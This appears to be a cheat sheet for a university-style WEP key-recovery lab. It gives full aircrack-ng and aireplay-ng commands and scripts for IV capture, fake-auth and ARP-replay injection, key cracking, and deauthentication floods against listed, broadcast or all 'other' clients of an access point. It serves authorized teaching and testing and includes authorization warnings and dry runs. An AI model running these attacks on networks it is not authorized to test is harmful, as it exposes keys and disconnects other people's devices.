# Lab #10 — Command cheat sheet

Copy-paste reference for the WEP key-recovery lab. The *why* is in
[README.md](README.md); this file is only the commands.

Replace `wlp2s0`, the BSSID (`11:22:33:44:55:66`) and the channel (`6`) with your values.

> Only run these against networks you are authorized to test.

---

## 1. Check the hardware

```bash
iw dev                                          # wireless interfaces (Fedora: wlp…, not wlan0)
ip -br addr                                     # IP address of each interface
lspci -nnk | grep -iA3 -E 'network|wireless'    # Wi-Fi card model and kernel driver
airmon-ng                                       # chipset/driver per interface
```

## 2. Install (once)

```bash
sudo dnf install aircrack-ng wireshark-cli     # wireshark-cli provides tshark, which the capture-health table reads captures with
```

## 3. Find the target's BSSID and channel

```bash
sudo ./scripts/airodump.sh -i wlp2s0            # lists every AP with its BSSID and CH; Ctrl-C stops and restores WiFi
sudo ./scripts/airodump.sh -i wlp2s0 -c 6       # same, locked to channel 6
sudo ./scripts/airodump.sh -i wlp2s0 -B abg    # also hop 5 GHz channels (the 3168NGW's 5 GHz hop is untested)
sudo ./scripts/managed-scan.sh -i wlp2s0        # managed scan: channel, signal, BSSID and name; keeps the connection
sudo ./scripts/managed-scan.sh -i wlp2s0 -c 6   # managed scan of channel 6 only
```

The RTL8723BE's monitor scans only show the channel the card started on. Use `managed-scan.sh`
to find a network's channel with it.

## 4. Run the attack with the script

```bash
./scripts/wep-crack.sh -h                       # full usage

# Passive: listen only. IVs come from traffic on the network, so start a download on a client
sudo ./scripts/wep-crack.sh -i wlp2s0 -b 11:22:33:44:55:66 -c 6 -m passive -o practice

# Active: fake-auth + ARP replay (needs a card that injects; on the 3168NGW the replay adds almost no IVs)
sudo ./scripts/wep-crack.sh -i wlp2s0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
```

| Flag | Meaning | Default |
|------|---------|---------|
| `-i` | Wi-Fi interface | *(required)* |
| `-M` | A monitor interface that is already up, instead of `-i`. This run neither starts nor stops it, and it stays up on exit. The card must already be on `-c` | *(none)* |
| `-b` | Target AP BSSID | *(required)* |
| `-c` | Channel the AP is on | *(required)* |
| `-e` | AP ESSID (helps fake-auth on some APs) | *(none)* |
| `-m` | `active` or `passive` | `active` |
| `-o` | Output prefix; the files go to a new folder under `logs/` | `wepcap` |
| `-t` | IVs gained before `aircrack-ng` runs again (first try at 40000) | `10000` |

When the run ends, it prints the capture-health table and saves it as `<prefix>-01-health.txt`
(section 11 explains the columns).

What the script does at each step, and why: see [README.md](README.md#how-the-scripts-work).

## 5. Check progress and results

Each run has its own folder in `logs/`, named by the start time and the prefix, for example
`2026-10-19_044700_cap_gl`. `<run>` below is that name.

```bash
ls logs/                                                 # one folder per run
ls -dt logs/*/ | head -n 1                               # the newest run folder
ls -lh logs/<run>/                                       # .cap, .csv, .key and attack output
grep -i 11:22:33:44:55:66 logs/<run>/cap_gl-01.csv       # column 11 ("# IV") = IVs captured so far
cat logs/<run>/cap_gl.key                                # recovered key, as hex (the script also prints the ASCII form)
```

## 6. Do the same steps by hand

Useful for debugging when the script misbehaves. The first test is also a script,
which sets the channel before it runs and restores WiFi afterwards:

```bash
sudo ./scripts/injection-test.sh -i wlp2s0 -c 1 -b <AP_BSSID>   # PASS = that AP answered; replies per AP are printed

# By hand. wlp2s0mon exists only on separate-vif cards (Intel); single-vif cards
# (RTL8723BE) use wlp2s0 itself.
MON=wlp2s0mon
MYMAC=$(cat /sys/class/net/$MON/address)

sudo iw dev $MON set channel 6
sudo aireplay-ng --test $MON            # "Injection is working!" = card can inject
sudo aireplay-ng --fakeauth 10 -o 1 -q 10 -a 11:22:33:44:55:66 -h $MYMAC $MON
sudo aireplay-ng --arpreplay -b 11:22:33:44:55:66 -h $MYMAC $MON
```

Crack a capture manually (`-b` picks the AP when the capture holds several):

```bash
aircrack-ng -b 11:22:33:44:55:66 logs/<run>/cap_gl-01.cap
aircrack-ng -q -b 11:22:33:44:55:66 -l logs/<run>/cap_gl.key logs/<run>/cap_gl-01.cap
```

## 7. Configure the GL-AR300M16 as the WEP target

Run from the laptop, connected to the router's LAN port. Keys are 1–4 entries,
each 5 or 13 ASCII characters, or 10 or 26 hex digits.

```bash
# Main AP with one key
ssh root@your-router-ip "sh -s -- '12345'" < router/wifi-wep-test.sh

# Custom SSID, two keys, transmit with key slot 2
ssh root@your-router-ip "SSID=Lab SLOT=2 sh -s -- '12345' '67890'" < router/wifi-wep-test.sh

# Check the AP is actually up
ssh root@your-router-ip "logread | grep -i hostapd | tail"

# The script doesn't change the channel. The lab router is on channel 6, where the AC8260 and the
# 3168NGW both injected in our tests.
```

If the router's own wpad has no WEP, run a WEP build from RAM. It is undone by `undo` or by a reboot. The Wi-Fi settings are not touched, so run `router/wifi-wep-test.sh` on the router afterwards. The WEP build is described in [router/wifi-wep-setup/README.md](router/wifi-wep-setup/README.md):

```bash
router/wifi-wep-setup/try-on-router.sh install <wpad>   # run from the laptop; <wpad> is the WEP build
router/wifi-wep-setup/try-on-router.sh undo             # GL.iNet's wpad runs again
```

Restore WPA2 afterwards with the backup the script made:

```bash
ssh root@your-router-ip "ls /root/wireless.*.bak"
ssh root@your-router-ip "cp /root/wireless.<timestamp>.bak /etc/config/wireless && wifi reload"
```

## 8. WiFi disappeared?

```bash
sudo ./scripts/wifi-recover.sh -i wlp2s0        # managed mode back, NetworkManager restarted

# By hand. Still in monitor mode? "type monitor" means yes
iw dev wlp2s0 info | grep type

# Single-interface drivers (e.g. the RTL8723BE) keep the managed name in monitor mode.
# The mode only changes while the link is down, and NetworkManager only adopts a card
# that is managed when it starts, so restart it last.
sudo ip link set wlp2s0 down
sudo iw dev wlp2s0 set type managed
sudo ip link set wlp2s0 up
sudo systemctl restart NetworkManager

# If the card has a separate wlp2s0mon interface instead:
sudo airmon-ng stop wlp2s0mon           # return the card to managed mode FIRST
sudo systemctl restart NetworkManager   # then restart networking
```

The script prints "did not finish its last restart" when the Intel firmware needs a reboot.

If it's still dark, see the troubleshooting table in [README.md](README.md#troubleshooting).

## 9. Make traffic for the IVs (the download test)

Passive capture gets IVs only from traffic on the network. The key recovery used a phone
downloading a file from the laptop over the WEP network while the capture ran.

```bash
mkdir -p ~/wepfeed && cd ~/wepfeed && dd if=/dev/urandom of=big.bin bs=1M count=200
# Open port 8000 to the LAN subnet only, then serve the file on the laptop's LAN address
sudo firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.8.0/24" port port="8000" protocol="tcp" accept'
python3 -m http.server 8000 --bind <laptop-LAN-address>     # Ctrl-C when the download is done
sudo firewall-cmd --remove-rich-rule='rule family="ipv4" source address="192.168.8.0/24" port port="8000" protocol="tcp" accept'
```

On the phone, on the WEP network, open `http://<laptop-LAN-address>:8000/big.bin`. Keep the
phone connected for the whole capture.

## 10. Make traffic for the IVs (the flood test)

A flood from the laptop over the wired LAN also gives IVs, as long as a station is on the network (TESTS.md 2.9, 2.18). Start the capture first, and run one flood at a time: two floods at once mix frame sizes in the capture (2.17).

```bash
python3 scripts/broadcast_feed.py 192.168.8.255 300 600     # to every station on the LAN, 300 a second for 10 minutes
python3 scripts/broadcast_feed.py <station-IP> 2000 120     # to one station's IP, 2,000 a second for 2 minutes
python3 scripts/broadcast_feed.py -h                        # usage, and why the payload size matters
```

The ESP32-C3 keyless-station test is in [esp32c3-station/README.md](esp32c3-station/README.md).

## 11. The evaluation window: capture health and deauth

The deauth command sends frames, so it is for the official evaluation window only. The
health table only reads files.

**Before the window, rehearse.** A dry run prints the plan and sends nothing. It needs no root and no card:

```bash
./scripts/competition-deauth.sh -b <BSSID> -c <CHANNEL> -u <HH:MM> --dry-run
```

Prepare:

1. The BSSID and the channel, from `managed-scan.sh` or from an airodump capture.
2. Optional, `clients.txt`: one client MAC per line, from a capture on that channel. The airodump CSV
   lists each client with the BSSID it is on:

   ```bash
   awk -F', *' -v b=<BSSID> 'NF == 7 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && toupper($6) == toupper(b) { print $1 }' logs/<run>/<prefix>-01.csv > clients.txt
   ```

   Leave this file out to target every client of the AP at once (the broadcast address).

   Or use `-x` (section 12.10): list only your own devices, and the run targets every other client it sees, read again every round.

**In the window, run it.** The card goes into monitor mode, so the laptop's own Wi-Fi drops, as it does during a capture. Run this or a capture, not both.

```bash
sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM> --in-window
sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM> --in-window -f clients.txt
sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM> --in-window -x logs/own-devices.txt
```

- `-M wlp2s0mon` takes the place of `-i wlp2s0` when a crack already runs on that monitor (section 12.7). This run then neither starts nor stops the monitor, and WiFi stays as the crack left it. `wep-crack.sh -M` joins a monitor the same way (section 12.9).
- `--in-window` is required, and you pass it only while the window is open.
- `-u HH:MM` is optional. Use it for the window's end: the run stops by itself at that time, on this machine's clock. Without it, the run goes until `-r` rounds or Ctrl-C.
- `-f clients.txt` is optional. With it, each round makes one call per listed client. Without it, each round
  makes one call to the broadcast address, which reaches every client.
- `-x logs/own-devices.txt` is optional, and replaces `-f`: each round targets every other client that the run's capture lists on the AP, minus the MACs in that file. Nothing is broadcast, and a round with no other client is skipped (section 12.10).
- `-r N` is optional: stop after N rounds (a short test). Without it, the run goes until `-u` or Ctrl-C.
- You type `START` at the prompt. Ctrl-C stops the run and restores WiFi.
- Each round sends 5 frames per target and then waits 2 s. A call still running after 30 s is stopped.

The run writes `deauth.log`, `aireplay.txt`, `capture-01.cap` and `capture-01-health.txt` to its run folder.
It prints the health table when it stops.

**The health table** (printed at the end of every run, `wep-crack.sh` too). To read an older capture by hand:

```bash
bash -c 'source scripts/wifi-lib.sh && capture_health logs/<run>/cap-01.cap <BSSID>'
```

- `WEP_frames`: data frames with the WEP bit, each carrying an IV
- `AP_bcast`: of those, the frames the AP sent to the broadcast address
- `retry%`: the share of those flagged as retries
- `deauth`, `disassoc`, `auth`, `assoc_req`: management frames of those types, per minute and in total. They
  carry the AP's address whoever sent them, so they show what reached the air.

**Limits.** aireplay-ng's `-a` mode waits for a beacon from the AP before it sends. When it cannot read the card's channel (it reports -1), it exits with "Couldn't determine current channel"
unless it is given `--ignore-negative-one`. The tool passes that flag only after it has checked, before the
first call, that the card reads back the channel given with `-c` and that the run's own capture hears the AP.
The AC8260 stopped this way (TESTS.md, section 2.19). On 20 Oct at 21:12 the 3168NGW did too, in the first
real run, before any frame was sent (`logs/2026-10-20_211235_deauth-ch6`). Earlier fake-auth output on the
3168NGW had "channel -1" followed by sends (TESTS.md, section 2.20). The fixed tool has not been run on air
yet (TESTS.md, section 5, item 14).

**Check it yourself.** Section 12 lists the commands, and what each should print.

## 12. Test each new script yourself

Run these in order. Steps 12.1 to 12.3 send nothing. Steps 12.4 and 12.5 send frames, only to your own phone and your own router. Replace `<router BSSID>` with the GL router's BSSID and `wlp2s0` with your card's interface. The `-u` times below are computed as ten minutes from now.

### 12.1 The capture-health table (reads a file, sends nothing)

```bash
bash -c 'source scripts/wifi-lib.sh && capture_health logs/2026-10-20_040047_cap_3168/cap_3168-01.cap <router BSSID>'
```

Expect one row per minute, then this total: `total 80906 36 1.1% 210 61842 439 15` (the 04:00 run in TESTS.md, section 2.20). For another capture, use its folder in `logs/` and its BSSID.

### 12.2 The table at the end of a run (listens only)

```bash
sudo ./scripts/wep-crack.sh -i wlp2s0 -b <router BSSID> -c 6 -m passive -o table_test
```

Passive mode only listens. Start a download on your phone over the router's Wi-Fi, let the run go for about a minute, then press Ctrl-C. Expect `Cleaning up`, then `What the air showed (saved to …/table_test-01-health.txt)` and the table.

### 12.3 Deauth: the plan (sends nothing)

```bash
./scripts/competition-deauth.sh -b <router BSSID> -c 6 -u $(date -d '+10 min' +%H:%M) --dry-run
```

Expect the broadcast plan and `Dry run: nothing was sent`. `./scripts/competition-deauth.sh -h` lists every option.

### 12.4 Deauth: one round to your phone (sends frames)

1. With the phone connected to the router's Wi-Fi, record the stations on the router's channel for about 20 seconds, then press Ctrl-C:
   ```bash
   sudo ./scripts/airodump.sh -i wlp2s0 -c 6 -w phone
   ```
2. Build the list from the new CSV, `logs/<run>/phone-01.csv`, with the awk line in section 11 (`<prefix>` = `phone`). Save it as `my-phone.txt`. It should hold your phone's MAC and nothing else.
3. Dry run with the list. Expect `1 listed client(s)`:
   ```bash
   ./scripts/competition-deauth.sh -b <router BSSID> -c 6 -u $(date -d '+10 min' +%H:%M) -f my-phone.txt --dry-run
   ```
4. The live round. Type `START` when asked. The laptop's Wi-Fi drops while it runs:
   ```bash
   sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <router BSSID> -c 6 -u $(date -d '+10 min' +%H:%M) -f my-phone.txt -r 1 --in-window
   ```
   Expect `[*] wlp2s0mon reports channel 6.` and `[*] The run's capture hears <router BSSID>.`, then one line `HH:MM:SS round 1 <phone MAC>: ...` ending in aireplay-ng's last output line, then `Done: 1 round(s)` and the table. If either check fails, the run stops before any frame, and the message says which one. The phone should lose its connection and reconnect. `deauth.log` and `aireplay.txt` in the run folder record what was sent.

The tool requires `--in-window` for every real run. On your own router it only confirms the run; it does not check the course window.

### 12.5 Deauth: broadcast to every client (optional)

Only when no other device on the router matters:

```bash
sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <router BSSID> -c 6 -u $(date -d '+10 min' +%H:%M) -r 1 --in-window
```

Expect `HH:MM:SS round 1 broadcast: ...`. The frames go to every client of the router.

### 12.6 Stopping

Ctrl-C stops any run at once, and the script restores WiFi on exit. The table may not show the deauth frames your laptop sent, because a monitor-mode card may not capture its own transmissions. I haven't checked that on this card, so judge the effect from `deauth.log` and from the phone.

### 12.7 Deauth during a crack (sends frames)

This checks that a round does not stop a running crack. The crack and the round use the same monitor, so the round takes `-M`, not `-i`. Run it on the GL router only.

1. Start the crack in one terminal. Its first lines name the monitor (`wlp2s0mon`):
   ```bash
   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <GL BSSID> -c 6 -m active -o cap_gl
   ```
   Expect `[*] Monitor interface: wlp2s0mon`, `[*] Associating with AP (fake auth)...`, then lines with `IVs`. Wait until the IV count rises.
2. In a second terminal, one round to your phone, using `my-phone.txt` from 12.4. Type `START` when asked. **This sends frames.**
   ```bash
   sudo ./scripts/competition-deauth.sh -M wlp2s0mon -b <GL BSSID> -c 6 -f my-phone.txt -r 1 --in-window
   ```
   Expect `[*] wlp2s0mon reports channel 6.` twice, `[*] The run's capture hears <GL BSSID>.`, one `round 1 <phone MAC>: ...` line, `Leaving wlp2s0mon in monitor mode: another run uses it.`, and `Done: 1 round(s)`. WiFi is not restored, because the crack still uses the card.
3. Back in the crack's terminal, the IV count keeps rising, and none of these lines appear: `fake auth stopped`, `ARP replay stopped`, `is gone`. Ctrl-C stops the crack and restores WiFi.

### 12.8 Does a deauth to the crack's card make it re-authenticate? (sends one frame)

Do this while the crack from 12.7 step 1 runs, in a third terminal. It sends one deauthentication frame to the crack's own card, to see how its fake auth reacts.

1. The card's MAC, which the crack uses as its station address:
   ```bash
   iw dev wlp2s0mon info | awk '/addr/{print $2}'
   ```
   Expect one MAC, such as `02:...`. Use it as `<card MAC>` below.
2. One deauth frame to that MAC. **This sends a frame.**
   ```bash
   sudo aireplay-ng --ignore-negative-one --deauth 1 -a <GL BSSID> -c <card MAC> wlp2s0mon
   ```
   Expect a `Sending ... DeAuth` line.
3. A few seconds later, read the crack's fake-auth log:
   ```bash
   tail -n 8 logs/<crack run folder>/cap_gl-fakeauth.txt
   ```
   Expect `Got a deauthentication packet! (Waiting 3 seconds)`, then about 3 s later `Sending Authentication Request (Open System)` and `Authentication successful`. If no `Got a deauthentication` line appears, the card does not hear its own frames, and this test says nothing about re-authentication.

### 12.9 A crack on a monitor that is already up (listens only)

`wep-crack.sh -M` joins a monitor that another run started, so the airodump, the crack and a later deauth can share one card. This run is passive, so it sends no frames. Run it on the GL router only.

1. Terminal 1: start the monitor and leave it running. It stays on channel 6, because the crack checks that channel:
   ```bash
   sudo ./scripts/airodump.sh -i wlp2s0 -c 6
   ```
   Expect `[*] Monitor interface: wlp2s0mon`, then the access points, with the GL router among them.
2. Terminal 2: the crack joins that monitor with `-M`, in passive mode:
   ```bash
   sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <GL BSSID> -c 6 -m passive -o shared_test
   ```
   Expect `[*] Using wlp2s0mon as it is, already in monitor mode.`, `[*] wlp2s0mon reports channel 6.`, `[*] Starting capture -> ...`, then lines with `IVs`. The table in terminal 1 keeps updating. No `airmon-ng` line appears, because this run starts no monitor.
3. Terminal 3: the channel is still 6:
   ```bash
   iw dev wlp2s0mon info | awk '/channel/'
   ```
   Expect a line that starts `channel 6 (2437 MHz)`.
4. Terminal 2, Ctrl-C. Expect `[*] Leaving wlp2s0mon in monitor mode: another run uses it.` Terminal 1 keeps running, and WiFi stays off, because airodump.sh still owns the card.
5. Terminal 1, Ctrl-C. Expect `[*] Stopping monitor interface wlp2s0mon...` after about 12 seconds, and then WiFi comes back. Stop the owner last: its Ctrl-C ends the monitor for any run that still uses it.

Two refusals stop before anything changes, so they are safe to try while the monitor is up on channel 6:
```bash
sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <GL BSSID> -c 11 -m passive
sudo ./scripts/wep-crack.sh -i wlp2s0mon -b <GL BSSID> -c 6 -m passive
```
Expect `[!] wlp2s0mon reports channel '6', not 11. Nothing was changed.` for the first. For the second, expect `[!] wlp2s0mon is already in monitor mode, so nothing was changed.`, then `give it with -M`, then the `wifi-recover.sh` hint.

### 12.10 Deauth to the other clients only (sends frames)

`-x` targets every other client of the router and leaves out the MACs in your own-devices file. Each round reads the run's own capture again, so a client that joins later is reached on the next round. Nothing is broadcast. Run it on the GL router first.

1. Your own addresses go in `logs/own-devices.txt`, one per line: your phone's (its address on this router, as in 12.4) and the ESP32's (the `station MAC` line in its serial log at startup). A `#` starts a comment.
   ```bash
   cat logs/own-devices.txt
   ```
   Expect one MAC per line, and nothing else.
2. Dry run. It sends nothing, and it needs no card:
   ```bash
   ./scripts/competition-deauth.sh -b <GL BSSID> -c 6 -x logs/own-devices.txt --dry-run
   ```
   Expect `Left out of every round, never sent to: the N MAC(s) in logs/own-devices.txt, this card and the AP:`, with your addresses indented under it, then `Dry run: nothing was sent`. A line that is not a MAC makes the run refuse, and the run names it.
3. The stations the run works from, before your addresses are taken out. Nothing is sent. Run it after a live run has started, with that run's folder:
   ```bash
   bash -c 'source scripts/wifi-lib.sh && stations_on_bssid logs/<run>/capture-01.csv <GL BSSID>'
   ```
   Expect one MAC per station on the router, your own among them.
4. The live run, with your phone and the ESP32 connected and no other device. Type `START`:
   ```bash
   sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <GL BSSID> -c 6 -x logs/own-devices.txt -r 5 --in-window
   ```
   Expect `N address(es) are left out of every round, listed in logs/<run>/excluded.txt.`, then one line per round: `round 1: no other client of <GL BSSID> in the capture yet`. Your addresses never appear in a round line, and nothing is sent while no other client is on the router.
5. The same, with one other device on the GL router that is not in `own-devices.txt` (a spare phone, switched on). **This sends frames to that device only.** Expect `round N: 1 other client(s): <its MAC>`, then `round N <its MAC>: ...` lines, and no line for your own addresses.
